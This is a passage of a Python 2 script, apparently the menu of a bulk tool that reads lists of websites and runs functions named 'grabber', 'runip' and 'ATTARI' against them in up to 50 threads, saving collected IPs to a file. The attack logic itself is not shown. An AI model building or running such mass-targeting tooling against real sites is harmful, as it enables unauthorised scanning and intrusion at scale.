    ooo = raw_input('\t        '+bb+("{}{} Give Me List To Get ip's: ").format(fr,sb))
    ooo = open(ooo,'r')
    ok = []
    print('Please Wait...')
    try:
        pack.runip()
    except:
        pass
    ok = set(ok)
    ok = list(ok)
    for hh in ok:
        print '[$$$]  '+hh
        with open('ip.txt','a') as it:
            it.writelines(hh+'\n')



elif atx =='4':
    #try:
    pack.grabber()
    #except:
     #   pass
elif atx =='1':
    speed = raw_input('\t        '+bb+("{}{} How Much You Want To Be Speed(The Best 50): ").format(fr,sb))
    ooo = raw_input('\t        '+bb+("{}{} Give Me List Websites: ").format(fr,sb))
    ooo = open(ooo,'r')
    ThreadPool = Pool(int(speed))
    Threads = ThreadPool.map(ATTARI, ooo)
    
else:
    print('Stupid')

















#message()

